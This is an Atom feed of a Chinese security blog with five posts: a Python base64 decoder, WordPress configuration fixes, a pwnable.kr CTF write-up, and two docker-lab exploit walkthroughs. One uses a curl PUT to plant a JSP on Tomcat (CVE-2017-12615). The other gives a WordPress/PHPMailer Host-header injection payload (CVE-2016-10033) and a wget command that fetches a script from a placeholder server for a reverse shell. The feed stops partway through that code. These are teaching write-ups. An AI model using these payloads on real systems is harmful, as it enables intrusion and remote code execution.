<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hvnt3r&#39;s Blog</title>
  
  <subtitle>让我们来猎杀那些陷入黑暗中的人吧-VN</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://hvnt3r.top/"/>
  <updated>2018-09-15T15:59:49.929Z</updated>
  <id>https://hvnt3r.top/</id>
  
  <author>
    <name>Hvnt3r</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Python将base64转为文档或者图片</title>
    <link href="https://hvnt3r.top/2018/09/Python%E5%B0%86base64%E8%BD%AC%E4%B8%BA%E6%96%87%E6%A1%A3%E6%88%96%E8%80%85%E5%9B%BE%E7%89%87/"/>
    <id>https://hvnt3r.top/2018/09/Python将base64转为文档或者图片/</id>
    <published>2018-09-15T15:58:45.000Z</published>
    <updated>2018-09-15T15:59:49.929Z</updated>
    
    <content type="html"><![CDATA[<p>有时候使用在线的base64解码遇到一些大文件或者编码比较复杂的可能会出现一些问题，就写了个脚本来解决<br>gist地址：<a href="https://gist.github.com/Hvnt3r/dad413128496cea8b4e4f66757b8e8c3" target="_blank" rel="noopener">https://gist.github.com/Hvnt3r/dad413128496cea8b4e4f66757b8e8c3</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string"> 将base码转换为文件的脚本，可以解码图片</span></span><br><span class="line"><span class="string"> Author:Hvnt3r</span></span><br><span class="line"><span class="string"> Date:2018.8.22</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="comment">#import codecs #解码其他编码格式如GBK需要的模块</span></span><br><span class="line"></span><br><span class="line">file_path=<span class="string">"E:/TMP/Python_test/one/"</span>   <span class="comment"># 定义文件所在的文件夹</span></span><br><span class="line">raw_file_name=<span class="string">"base64.txt"</span>            <span class="comment"># 定义存放base64的文件名</span></span><br><span class="line">decoded_file_name=<span class="string">"decoded_file.doc"</span>  <span class="comment"># 定义转换后的文件名，包括后缀</span></span><br><span class="line"></span><br><span class="line">FILE_PATH=file_path+raw_file_name</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">base_to_file</span><span class="params">(FILE)</span>:</span></span><br><span class="line">    base64String = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#1.从文件中读取base64并解码</span></span><br><span class="line">    <span class="comment">#with codecs.open(FILE, 'r', 'gbk') as f:   # 读取其他编码的文件</span></span><br><span class="line">    <span class="keyword">with</span> open(FILE, <span class="string">'rb'</span>) <span class="keyword">as</span> file:   <span class="comment"># 将文件路径和文件名改成自己需要的</span></span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> file.readlines():  <span class="comment">#  去除每一行之后的换行符</span></span><br><span class="line">            base64String += line.strip()</span><br><span class="line"></span><br><span class="line">    <span class="comment">#2.从粘贴的字符串中解码</span></span><br><span class="line">    <span class="comment">#raw_base64String = "在这里粘贴待转换的base64字符串"</span></span><br><span class="line">    <span class="comment">#for line in raw_base64String.rstrip("\n"):   # 去除每一行之后的换行符</span></span><br><span class="line">    <span class="comment">#    base64String+=line.strip()</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#写入文件</span></span><br><span class="line">    <span class="keyword">with</span> open(decoded_file_name, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(base64.b64decode(base64String))</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"解码完毕"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    base_to_file(FILE_PATH)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;有时候使用在线的base64解码遇到一些大文件或者编码比较复杂的可能会出现一些问题，就写了个脚本来解决&lt;br&gt;gist地址：&lt;a href=&quot;https://gist.github.com/Hvnt3r/dad413128496cea8b4e4f66757b8e8c3&quot; t
      
    
    </summary>
    
      <category term="Python" scheme="https://hvnt3r.top/categories/Python/"/>
    
    
      <category term="CTF" scheme="https://hvnt3r.top/tags/CTF/"/>
    
      <category term="编程" scheme="https://hvnt3r.top/tags/%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>WordPress一些配置问题</title>
    <link href="https://hvnt3r.top/2018/09/%C2%96WordPress%E4%B8%80%E4%BA%9B%E9%85%8D%E7%BD%AE%E9%97%AE%E9%A2%98/"/>
    <id>https://hvnt3r.top/2018/09/WordPress一些配置问题/</id>
    <published>2018-09-15T15:55:59.000Z</published>
    <updated>2018-09-15T15:57:14.661Z</updated>
    
    <content type="html"><![CDATA[<h1 id="WordPress一些配置问题"><a href="#WordPress一些配置问题" class="headerlink" title="WordPress一些配置问题"></a>WordPress一些配置问题</h1><h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><h3 id="WordPress的URL设置错误导致博客无法正常显示"><a href="#WordPress的URL设置错误导致博客无法正常显示" class="headerlink" title="WordPress的URL设置错误导致博客无法正常显示"></a>WordPress的URL设置错误导致博客无法正常显示</h3><p><strong>情景描述</strong></p><p>由于我的博客没有做正确的配置（在这里吐槽一下wordpress实在是太脆弱了，各种兼容性不友好），我的博客通过域名访问后会在地址栏变为我的服务器的IP地址，觉得这样十分不美观，于是就想自定义一下我的URL，百度之后发现这个可以直接在WP的设置中更改，但是我小手一抖，想改的URL还没打完就不小心按了回车键，结果博客立马就炸了，所有的资源链接都变成了我的那个不完整的链接，因此页面无法正常的完成加载，页面的响应速度也很慢，也无法正常登陆了，下面我来记录一下这个问题的解决办法。</p><p><strong>解决方法：</strong></p><p>这个问题需要修改数据库，首先用ssh连接上服务器，<code>cd</code>到WP的根目录</p><p>在终端内输入下列命令并输入密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p</span><br></pre></td></tr></table></figure><p>登陆后切换数据库:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">USE wordpress;</span><br></pre></td></tr></table></figure><p>列举wp-content表单前5的数据：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from wp_options limit 5;</span><br></pre></td></tr></table></figure><p>修改数据库中的数据，将双引号内的域名换为自己的域名：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE wp_options SET option_value=&quot;http://www.xxxxx.com&quot; WHERE option_name=&quot;siteurl&quot;;</span><br></pre></td></tr></table></figure><p>至此修复完毕，刷新浏览器即可看到正常的页面。</p><h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><h3 id="WordPress配置SSL证书"><a href="#WordPress配置SSL证书" class="headerlink" title="WordPress配置SSL证书"></a>WordPress配置SSL证书</h3><p><strong>证书申请</strong></p><p>腾讯云有免费的SSL证书，我上去申请了一个</p><p><strong>安装方法：</strong></p><h4 id="1-1-获取证书"><a href="#1-1-获取证书" class="headerlink" title="1.1 获取证书"></a>1.1 获取证书</h4><p>Apache文件夹内获得证书文件 1_root_bundle.crt，2_<a href="http://www.domain.com_cert.crt" target="_blank" rel="noopener">www.domain.com_cert.crt</a> 和私钥文件 3_<a href="http://www.domain.com.key" target="_blank" rel="noopener">www.domain.com.key</a>,<br>1_root_bundle.crt 文件包括一段证书代码 “—–BEGIN CERTIFICATE—–”和“—–END CERTIFICATE—–”,<br>2_<a href="http://www.domain.com_cert.crt" target="_blank" rel="noopener">www.domain.com_cert.crt</a> 文件包括一段证书代码 “—–BEGIN CERTIFICATE—–”和“—–END CERTIFICATE—–”,<br>3_<a href="http://www.domain.com.key" target="_blank" rel="noopener">www.domain.com.key</a> 文件包括一段私钥代码“—–BEGIN RSA PRIVATE KEY—–”和“—–END RSA PRIVATE KEY—–”。</p><h4 id="1-2-证书安装"><a href="#1-2-证书安装" class="headerlink" title="1.2 证书安装"></a>1.2 证书安装</h4><p>编辑Apache根目录下 <code>/etc/apache2/sites-enabled/default-ssl.conf</code>文件:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;VirtualHost _default_:443&gt;</span><br><span class="line">    DocumentRoot &quot;/var/www/html&quot;</span><br><span class="line">    ServerName www.domain.com</span><br><span class="line">    SSLEngine on</span><br><span class="line">    SSLCertificateFile /usr/local/apache/conf/2_www.domain.com_cert.crt</span><br><span class="line">    SSLCertificateKeyFile /usr/local/apache/conf/3_www.domain.com.key</span><br><span class="line">    SSLCertificateChainFile /usr/local/apache/conf/1_root_bundle.crt</span><br><span class="line">&lt;/VirtualHost&gt;</span><br></pre></td></tr></table></figure></p><p>大力出奇迹，我在寻找相关配置的选项的时候出了很多差错，导致网站一度拒绝连接，而且的我的腾讯云也没有一键备份还原的选项，搞崩了就得做好重装的准备，因此我强烈建议把你要修改的文件做一个备份，或者在修改时别直接在原选项上修改，而是注释掉官方的，自己手打一行，如果不行的话就把自己的删掉不影响原来的数据，我选择把源文件中所有的选项都注释掉，然后直接将上述代码粘贴到配置文件里，不容易出错，最后用<code>sudo service apsche2 restart</code>命令重启一下服务就能发现网站已经正确配置了ssl，但是wordpress可能在某些页面上仍然无法正确显示https，原因是要修改数据库里面的url，方法见文章上半部分，将http修改为https即可。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;WordPress一些配置问题&quot;&gt;&lt;a href=&quot;#WordPress一些配置问题&quot; class=&quot;headerlink&quot; title=&quot;WordPress一些配置问题&quot;&gt;&lt;/a&gt;WordPress一些配置问题&lt;/h1&gt;&lt;h2 id=&quot;0x00&quot;&gt;&lt;a href
      
    
    </summary>
    
      <category term="日常挖坑" scheme="https://hvnt3r.top/categories/%E6%97%A5%E5%B8%B8%E6%8C%96%E5%9D%91/"/>
    
    
      <category term="Wordpress" scheme="https://hvnt3r.top/tags/Wordpress/"/>
    
      <category term="PHP" scheme="https://hvnt3r.top/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>Tomcat 远程代码执行漏洞 (CVE-2017-12615)</title>
    <link href="https://hvnt3r.top/2018/09/Tomcat-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2017-12615/"/>
    <id>https://hvnt3r.top/2018/09/Tomcat-远程代码执行漏洞-CVE-2017-12615/</id>
    <published>2018-09-08T08:44:12.000Z</published>
    <updated>2018-09-08T08:44:57.211Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Tomcat-远程代码执行漏洞-CVE-2017-12615"><a href="#Tomcat-远程代码执行漏洞-CVE-2017-12615" class="headerlink" title="Tomcat 远程代码执行漏洞 (CVE-2017-12615)"></a>Tomcat 远程代码执行漏洞 (CVE-2017-12615)</h1><h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>首先还是通过docker搭建实验环境 ，实验环境需要docker来挂载，docker安装教程：<a href="https://blog.csdn.net/levones/article/details/80474994" target="_blank" rel="noopener">https://blog.csdn.net/levones/article/details/80474994</a></p><p>下载docker镜像：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull medicean/vulapps:t_tomcat_1</span><br></pre></td></tr></table></figure><p>启动镜像：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p 8001:8080 medicean/vulapps:t_tomcat_1</span><br></pre></td></tr></table></figure><p>启动镜像的命令中-p 8001:8080中冒号之前的端口号可自行指定</p><p>Docker成功挂载后访问ip:port的界面：</p><p><img src="https://s1.ax1x.com/2018/05/28/C4K7ee.png" alt="C4K7ee.png"></p><h2 id="0x01-POC"><a href="#0x01-POC" class="headerlink" title="0x01  POC"></a>0x01  POC</h2><p>这个漏洞的利用代码比较简单，是直接使用curl向网站根目录下写入一个jsp文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X PUT <span class="string">"http://your_server_ip:port/test.jsp/"</span> -d <span class="string">'&lt;%out.println("Test_hack");%&gt;'</span></span><br></pre></td></tr></table></figure><p>命令成功执行后直接访问测试靶机<a href="http://ip:port/test.jsp即可看到成功向靶机写入了一个jsp文件。" target="_blank" rel="noopener">http://ip:port/test.jsp即可看到成功向靶机写入了一个jsp文件。</a></p><p><img src="https://s1.ax1x.com/2018/05/28/C4KoLD.png" alt="C4KoLD.png"></p><p>关于此漏洞更加详细的分析与利用：<a href="https://mp.weixin.qq.com/s/dgWT3Cgf1mQs-IYxeID_Mw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/dgWT3Cgf1mQs-IYxeID_Mw</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Tomcat-远程代码执行漏洞-CVE-2017-12615&quot;&gt;&lt;a href=&quot;#Tomcat-远程代码执行漏洞-CVE-2017-12615&quot; class=&quot;headerlink&quot; title=&quot;Tomcat 远程代码执行漏洞 (CVE-2017-12615)
      
    
    </summary>
    
      <category term="CVE" scheme="https://hvnt3r.top/categories/CVE/"/>
    
    
      <category term="CVE" scheme="https://hvnt3r.top/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>fd_WriteUp(pwnable.kr_fd)Linux文件描述符</title>
    <link href="https://hvnt3r.top/2018/09/fd-WriteUp-pwnable-kr%E2%80%94%E2%80%94-fd-Linux%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6/"/>
    <id>https://hvnt3r.top/2018/09/fd-WriteUp-pwnable-kr——-fd-Linux文件描述符/</id>
    <published>2018-09-07T03:01:53.000Z</published>
    <updated>2018-09-07T03:03:26.119Z</updated>
    
    <content type="html"><![CDATA[<h1 id="fd-WriteUp-pwnable-kr-fd详细解析"><a href="#fd-WriteUp-pwnable-kr-fd详细解析" class="headerlink" title="fd_WriteUp(pwnable.kr_fd详细解析)"></a>fd_WriteUp(pwnable.kr_fd详细解析)</h1><p>本题目来自：<a href="http://pwnable.kr/play.php" target="_blank" rel="noopener">http://pwnable.kr/play.php</a></p><p><img src="https://s1.ax1x.com/2018/07/13/PKn8Q1.png" alt="PKn8Q1.png"></p><p>首先根据题目提示使用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh fd@pwnable.kr -p2222</span><br></pre></td></tr></table></figure><p>来连接到目标服务器，密码为guest</p><p><img src="https://s1.ax1x.com/2018/07/13/PKn1zR.png" alt="PKn1zR.png"></p><p>ls一下发现当前目录下有三个文件，一看到flag字样的文件名就下意识的cat flag但是发现没有读取权限，而除了flag文件外还有一个源码和一个可执行文件，显然作者的意图是让玩家分析源代码再通过可执行文件读取flag里面的内容。</p><p><img src="https://s1.ax1x.com/2018/07/13/PKnGsx.png" alt="PKnGsx.png"></p><p>fd.c内容如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">32</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>* envp[])</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"pass argv[1] a number\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> fd = atoi( argv[<span class="number">1</span>] ) - <span class="number">0x1234</span>;</span><br><span class="line"><span class="keyword">int</span> len = <span class="number">0</span>;</span><br><span class="line">len = read(fd, buf, <span class="number">32</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="built_in">strcmp</span>(<span class="string">"LETMEWIN\n"</span>, buf))&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"good job :)\n"</span>);</span><br><span class="line">system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"learn about Linux file IO\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在我们来分析一下代码</p><p>首先main函数使用了带参数的形式：<code>int main(int argc, char* argv[], char* envp[])</code></p><p>argc: 参数的个数，不给main()函数传递参数时默认值为1，即至少有一个参数为该可执行文件的文件名（含目录）。</p><p>argv: 为指针数组，分别指向各个字符串参数的首地址，其中argv[0]存储的是可执行文件的文件名的首地址 。</p><p>envp:存放系统的环境变量 。</p><p>假设有一个文件名为1.sh的文件中主函数声明为<code>int main(int argc , char* argv[] )</code>的形式，如果调用时使用<code>root@kali-linux:~# ./1.sh hahaha xixixi hehehe</code>的形式，则此时argc的值为4，argv[0]为“1.sh” ，argv[1]为“hahaha”，argv[2]为“xixixi”，argv[3]为“hehehe”   。</p><p>那么这个代码块：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"pass argv[1] a number\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>表示的意思是运行fd的时候需要加参数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> fd = atoi( argv[<span class="number">1</span>] ) - <span class="number">0x1234</span>;</span><br><span class="line"><span class="keyword">int</span> len = <span class="number">0</span>;</span><br><span class="line">len = read(fd, buf, <span class="number">32</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="built_in">strcmp</span>(<span class="string">"LETMEWIN\n"</span>, buf))&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"good job :)\n"</span>);</span><br><span class="line">system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以上代码将argv[1]即第一个参数做了转整型的处理，使用的是atoi()函数：</p><p><strong>int atoi(const char *str)</strong> 把参数 <strong>str</strong> 所指向的字符串转换为一个整数（类型为 int 型）</p><p>而后面又使用<code>read(fd, buf, 32)</code>把fd（文件描述）所指的文件传送32个字节到buf所指的内存中，read()函数返回值为实际读取到的字节数, 如果返回0, 表示已到达文件尾或是无可读取的数据。若参数count 为0, 则read()不会有作用并返回0。</p><p>关于文件描述符：</p><table><thead><tr><th>文件描述符的值</th><th>意义</th></tr></thead><tbody><tr><td>0</td><td>标准输入</td></tr><tr><td>1</td><td>标准输出</td></tr><tr><td>2</td><td>错误</td></tr></tbody></table><p><code>strcmp(&quot;LETMEWIN\n&quot;, buf)</code>将用户输入的字符串与“LETMEWIN”进行比较，如果一致则输出flag的内容，因此我们需要找到输入的点，因此本题的关键点在于通过控制argv[1] (第一个参数)来修改文件的描述符为0从而修改文件状态为标准输入，再输入“LETMEWIN”来得到flag，此时我们需要考虑如何时文件描述符为0，<code>int fd = atoi( argv[1] ) - 0x1234</code>文件描述符在程序中的变量名为fd(file descriptor),因此我们需要将<code>atoi( argv[1] ) - 0x1234</code>的值设为0,0x1234为16进制数，如果我们在参数输入时输入0x1234，atoi()函数会将0x1234中的x转为整型数字，因此数值会发生变化，此时应该使用进制转换将0x1234转换为十进制的4660再输入“LETMEWIN”即可获得flag。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fd@ubuntu:~$ ./fd 4660</span><br><span class="line">LETMEWIN</span><br><span class="line">good job :)</span><br><span class="line">mommy! I think I know what a file descriptor is!!</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;fd-WriteUp-pwnable-kr-fd详细解析&quot;&gt;&lt;a href=&quot;#fd-WriteUp-pwnable-kr-fd详细解析&quot; class=&quot;headerlink&quot; title=&quot;fd_WriteUp(pwnable.kr_fd详细解析)&quot;&gt;&lt;/a&gt;f
      
    
    </summary>
    
      <category term="CTF" scheme="https://hvnt3r.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://hvnt3r.top/tags/CTF/"/>
    
      <category term="PWN" scheme="https://hvnt3r.top/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>WordPress小于等于4.6 命令执行漏洞(PHPMailer)(CVE-2016-10033)实验</title>
    <link href="https://hvnt3r.top/2018/09/WordPress%E5%B0%8F%E4%BA%8E%E7%AD%89%E4%BA%8E4-6-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-PHPMailer-CVE-2016-10033-%E5%AE%9E%E9%AA%8C/"/>
    <id>https://hvnt3r.top/2018/09/WordPress小于等于4-6-命令执行漏洞-PHPMailer-CVE-2016-10033-实验/</id>
    <published>2018-09-06T00:38:09.000Z</published>
    <updated>2018-09-06T00:40:09.148Z</updated>
    
    <content type="html"><![CDATA[<h1 id="WordPress-lt-4-6-命令执行漏洞-PHPMailer-CVE-2016-10033-实验"><a href="#WordPress-lt-4-6-命令执行漏洞-PHPMailer-CVE-2016-10033-实验" class="headerlink" title="WordPress &lt;= 4.6 命令执行漏洞(PHPMailer)(CVE-2016-10033)实验"></a>WordPress &lt;= 4.6 命令执行漏洞(PHPMailer)(CVE-2016-10033)实验</h1><h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>此漏洞利用的是HTTP头部注入，参考资料：<a href="http://www.freebuf.com/articles/web/164817.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/164817.html</a></p><p>首先放出实验来源：<a href="http://vulapps.evalbug.com/w_wordpress_6/" target="_blank" rel="noopener">http://vulapps.evalbug.com/w_wordpress_6/</a></p><p>实验环境需要docker来挂载，docker安装教程：<a href="https://blog.csdn.net/levones/article/details/80474994" target="_blank" rel="noopener">https://blog.csdn.net/levones/article/details/80474994</a></p><h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>WordPress 是一种使用 PHP 语言开发的博客平台，用户可以在支持 PHP 和 MySQL 数据库的服务器上架设属于自己的网站。也可以把 WordPress 当作一个内容管理系统（CMS）来使用。WordPress 使用 PHPMailer 组件向用户发送邮件。PHPMailer(版本 &lt; 5.2.18)存在远程命令执行漏洞，攻击者只需巧妙地构造出一个恶意邮箱地址，即可写入任意文件，造成远程命令执行的危害。</p><h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>拉取镜像到本地计算机（ubuntu16.04）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull medicean/vulapps:w_wordpress_6</span><br></pre></td></tr></table></figure><p>启动实验环境</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p 8000:80 medicean/vulapps:w_wordpress_6</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2018/05/28/C4VEr9.png" alt="C4VEr9.png"></p><p><img src="https://s1.ax1x.com/2018/05/28/C4VeV1.png" alt="C4VeV1.png"></p><p><img src="https://s1.ax1x.com/2018/05/28/C4VAKJ.png" alt="C4VAKJ.png"></p><p>如果上述步骤没有出现错误的话访问ip:port可以看到如下界面：</p><p><img src="https://s1.ax1x.com/2018/05/28/C4VmUx.png" alt="C4VmUx.png"></p><h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/wp-login.php?action=lostpassword</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: target(any -froot@localhost -be $&#123;run&#123;$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;bin$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;touch$&#123;substr&#123;10&#125;&#123;1&#125;&#123;$tod_log&#125;&#125;$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;var$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;www$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;html$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;test&#125;&#125; null)</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:53.0) Gecko/20100101 Firefox/53.0</span><br><span class="line"><span class="attribute">Accept</span>: */*</span><br><span class="line"><span class="attribute">Content-Length</span>: 56</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">wp-submit=Get+New+Password&amp;redirect_to=&amp;user_login=admin</span><br></pre></td></tr></table></figure><p>将此poc通过burp suite进行重放，IP和端口自行设定。重放前访问<a href="http://ip:port/test时返回404" target="_blank" rel="noopener">http://ip:port/test时返回404</a></p><p><img src="https://s1.ax1x.com/2018/05/28/C4VFv4.png" alt="C4VFv4.png"></p><p>重放后再次访问会返回200ok，此时说明POC中执行的命令:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/touch /var/www/html/<span class="built_in">test</span></span><br></pre></td></tr></table></figure><p>执行成功，由此验证了此版本的WordPress存在命令执行漏洞。</p><h2 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h2><h3 id="EXP-利用漏洞"><a href="#EXP-利用漏洞" class="headerlink" title="EXP   利用漏洞"></a>EXP   利用漏洞</h3><h4 id="思路一：直接进行命令执行反弹shell"><a href="#思路一：直接进行命令执行反弹shell" class="headerlink" title="思路一：直接进行命令执行反弹shell"></a>思路一：直接进行命令执行反弹shell</h4><p>通过wget下载bash脚本然后执行</p><p>注意事项：</p><ol><li>远程 URL 中不要有 <code>http://</code></li><li>所有字母必须小写</li><li>所有 / 用 <code>${substr{0}{1}{$spool_directory}}</code> 代替</li><li>所有 空格 用 <code>${substr{10}{1}{$tod_log}}</code> 代替</li></ol><p>下载：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/wget --output-document /tmp/rce your_server_ip/example.txt</span><br></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 